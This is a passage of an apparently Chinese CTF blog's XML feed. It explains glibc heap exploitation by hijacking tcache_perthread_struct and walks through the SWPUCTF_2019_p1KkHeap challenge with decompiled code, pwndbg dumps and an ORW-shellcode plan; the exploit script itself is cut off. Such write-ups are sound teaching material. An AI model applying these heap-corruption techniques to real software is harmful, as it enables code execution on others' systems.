(*hook)(void *, const void *) = atomic_forced_read(__free_hook);</span><br><span class="line">  if (__builtin_expect(hook != NULL, 0)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(0));</span><br><span class="line">    return; // 跳过后续释放逻辑</span><br><span class="line">  &#125;</span><br><span class="line">  // 正常释放流程</span><br><span class="line">  _int_free(&amp;main_arena, mem, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>__free_hook</code>函数会以传入<code>__libc_free</code>的对应chunk的mem地址为参数。而打<code>__malloc_hook</code>时候则更多需要one_gadget的辅助了<br>glibc2.34+各类hooks被移除，因此也需要掌握其他方法.</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持tcache_perthread_struct</title>
      <link href="/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/"/>
      <url>/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-关于tcache-perthread-struct"><a href="#0x00-关于tcache-perthread-struct" class="headerlink" title="0x00 关于tcache_perthread_struct"></a>0x00 关于tcache_perthread_struct</h2><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，与 fastbin 类似。 tcache 引入了两个新的结构体，<code>tcache_entry</code>和 <code>tcache_perthread_struct</code> 。<br>两个结构体源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TCACHE_MAX_BINS:</span><br><span class="line"># define TCACHE_MAX_BINS        64</span><br></pre></td></tr></table></figure><p>我们在引入了<code>tcache</code>的glibc版本中，申请第一块<code>chunk</code>时查看heap状态会发现多申请了一块大小0x250的chunk（glibc2.32+为0x290，因为<code>counts</code>的类型从char变成了uint16_t）。这个<code>chunk</code>就是 <code>tcache_perthread_struct</code><br><code>counts</code>数组存储的是各个size的<code>tcache bin</code>中的<code>chunk</code>数量，而<code>entries</code>指针数组则存放着各个size的<code>tcache bin</code>中的第一个<code>chunk</code>的<code>mem</code>地址(fd地址而非堆头地址)<br>我们通过调试SWPUCTF_2019_p1KkHeap这道题目的程序来使其直观化<br>我们先申请了size为0x80，0x90，0xa0的三个chunk，查看heap如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01000</span><br><span class="line">Size: 0x250 (with flag bits: 0x251)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01250</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a012e0</span><br><span class="line">Size: 0xa0 (with flag bits: 0xa1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01380</span><br><span class="line">Size: 0xb0 (with flag bits: 0xb1)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01430</span><br><span class="line">Size: 0x20bd0 (with flag bits: 0x20bd1)</span><br></pre></td></tr></table></figure><p>发现除了我们申请的三个chunk，还有一个size为0x250的chunk，正是 <code>tcache_perthread_struct</code>。然后我们free申请的三个chunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01000</span><br><span class="line">Size: 0x250 (with flag bits: 0x251)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01250</span><br><span class="line">Size: 0x90 (with flag bits: 0x91)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a012e0</span><br><span class="line">Size: 0xa0 (with flag bits: 0xa1)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01380</span><br><span class="line">Size: 0xb0 (with flag bits: 0xb1)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555a01430</span><br><span class="line">Size: 0x20bd0 (with flag bits: 0x20bd1)</span><br></pre></td></tr></table></figure><p>注意这里显示的chunk地址是从堆头开始计的，也就是包括了<code>pre_size</code>域和<code>size</code>域。此时查看bins</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x555555a01260 ◂— 0</span><br><span class="line">0xa0 [  1]: 0x555555a012f0 ◂— 0</span><br><span class="line">0xb0 [  1]: 0x555555a01390 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>注意bins中的chunk地址是从fd开始计的<br>三个chunk已经加入了tcachebins（大小为0x20到0x410),我们查看 <code>tcache_perthread_struct</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80gx 0x555555a01000</span><br><span class="line">0x555555a01000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555a01010: 0x0100000000000000      0x0000000000000101</span><br><span class="line">0x555555a01020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01080: 0x0000000000000000      0x0000555555a01260</span><br><span class="line">0x555555a01090: 0x0000555555a012f0      0x0000555555a01390</span><br><span class="line">0x555555a010a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a010f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01180: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01190: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a011f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01200: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01210: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01220: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01230: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555a01240: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>正如上示， <code>tcache_perthread_struct</code>的size域为0x251（含标志位），实际大小为0x555555a01000到0x555555a01240的0x250大小的一块。<br>我们先记0x555555a01000为heapbase，heapbase+0x10到heapbase+0x40这一块为counts数组，heapbase+0x50到heapbase+0x250的大小0x200（0x40*8）的一块为entries数组<br>heapbase+0x50存放大小0x20的tcachebin的第一个chunk的fd地址，heapbase+0x58存放大小0x30的tcachebin的第一个chunk的fd地址，以此类推，在heap+0x88存放的是大小0x90的tcachebin的第一个chunk的mem地址，即0x555555a01260，heap+0x90和heap+0x98处同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x555555a01080: 0x0000000000000000      0x0000555555a01260</span><br><span class="line">0x555555a01090: 0x0000555555a012f0      0x0000555555a01390</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x90 [  1]: 0x555555a01260 ◂— 0</span><br><span class="line">0xa0 [  1]: 0x555555a012f0 ◂— 0</span><br><span class="line">0xb0 [  1]: 0x555555a01390 ◂— 0</span><br></pre></td></tr></table></figure><p>而<code>counts</code>数组位置记录的chunk数量是如何索引的呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40bx 0x555555a01010</span><br><span class="line">0x555555a01010: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x01</span><br><span class="line">0x555555a01018: 0x01    0x01    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01020: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01028: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x555555a01030: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure><p>如上所示为<code>counts</code>数组，在<code>counts</code>数组为<code>char</code>类型的版本中（也就是此处版本），在小端序情况下，从heap+0x10处开始，按照低字节到高字节（也就是低地址到高地址）存储。如上所示（在使用x&#x2F;gx查看de时候显示出的数据会按照小端序的方式以0x8字节为单位呈现，会使得在高地址的第八个0x01被理解为高位，所以改用x&#x2F;bx查看更加直观）<br>第1字节存放大小0x20的<code>tcachebin</code>的chunk数量，以此类推看到第8字节，9字节，10字节都是0x01，也就是我们释放的三个chunk。</p><h2 id="0x01-漏洞利用：修改counts数组和entries指针数组"><a href="#0x01-漏洞利用：修改counts数组和entries指针数组" class="headerlink" title="0x01 漏洞利用：修改counts数组和entries指针数组"></a>0x01 漏洞利用：修改counts数组和entries指针数组</h2><p>看tcache_free函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<span class="comment">//&lt;7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>当对应大小的tcachebin中的chunk数量小于7时，会优先放入tcachebin，然而这里检查的是<code>tcache-&gt;counts</code>数组中的元素，也就是根据<code>tcache_perthread_struct</code>中的数据来判断，但却没有检查double free（在glibc2.29之后引入了key字段来防御double free，然而仍然可以绕过，关于不同版本glibc的堆管理和保护机制我再单独开一篇<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">博客</a>来记录）<br>而<code>tcache_perthread_struct</code>本身也是可以free的，其也可直接当做大小0x250（0x290）的chunk来看待。同理，如果想要把<code>tcache_perthread_struct</code>放入unsorted bin，就要将<code>tcache-&gt;counts</code>中记录0x250（0x290）大小chunk的数量改为7<br>看在使用tcache时的malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里是根据<code>tcache-&gt;entries</code>数组的元素来索引tcachebins中的第一个chunk，同样也是根据<code>tcache_perthread_struct</code>中的数据来判断。<br>所以说，如果我们能够修改<code>tcache_perthread_struct</code>中的数据，也就能控制整个tcachebins。我们可以修改counts数组的数量，以将chunk放到我们想放置的其他bins中（比如放入unsortedbin来泄露malloc_hook，libc），也可以修改entries数组的数据来malloc任意地址。</p><h2 id="0x02-以SWPUCTF-2019-p1KkHeap为例"><a href="#0x02-以SWPUCTF-2019-p1KkHeap为例" class="headerlink" title="0x02 以SWPUCTF_2019_p1KkHeap为例"></a>0x02 以SWPUCTF_2019_p1KkHeap为例</h2><p>先放源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_B0A();</span><br><span class="line">  v3 = <span class="string">&quot;                           Welcome to SWPUCTF 2019&quot;</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                           Welcome to SWPUCTF 2019&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( dword_202024 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = sub_1076();</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">5</span> )</span><br><span class="line">        Exit();</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; <span class="number">5</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Delete(v3, a2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="string">&quot;p1Kk wants a boyfriend!&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;p1Kk wants a boyfriend!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Add(v3, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Show(v3, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    --dword_202024;</span><br><span class="line">  &#125;</span><br><span class="line">  Exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单，限制操作次数至多为0x12，看选项函数<br>add</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_E1E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  size = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  v1 = sub_DA9();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202100[v1] = <span class="built_in">malloc</span>(size);</span><br><span class="line">    dword_2020E0[v1] = size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最多申请八次堆，每次返回不同索引，size至多为0x100<br>edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_EC1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  v1 = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;qword_202100 + v1), dword_2020E0[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dword_2020E0数组记录了chunk大小，不能溢出<br>show</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_F58</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  v1 = sub_1076();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)qword_202100[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_202020 &lt;= <span class="number">0</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;id: &quot;</span>);</span><br><span class="line">  sub_1076();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)v0 &gt; <span class="number">7</span> )</span><br><span class="line">    Exit();</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)qword_202100[v0]);</span><br><span class="line">  dword_2020E0[v2] = <span class="number">0</span>;</span><br><span class="line">  --dword_202020;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dword_202020限制只能free三次，指针没置零。但是dword_2020E0数组对应项置零，free后无法edit，只能show。<br>那么思路就是，先泄露tcache_perthread_struct的地址，然后修改counts数组，将chunk放到unsortedbin，泄露出malloc_hook<br>我们还能注意到，程序映射了一块rwx内存位于0x66660000，可读可写可执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mmap((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>) != (<span class="type">void</span> *)<span class="number">1717960704</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">memset</span>((<span class="type">void</span> *)<span class="number">0x66660000</span>, <span class="number">0</span>, <span class="number">0x1000u</span>LL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)<span class="number">0x66660000</span>, <span class="string">&quot;SWPUCTF_p1Kk&quot;</span>);</span><br></pre></td></tr></table></figure><p>那么思路很清晰了，只需要向这块区域写入shellcode即可。但是写入后发现无法getshell，后来发现程序开启了沙箱。那么用shellcode进行orw即可。<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 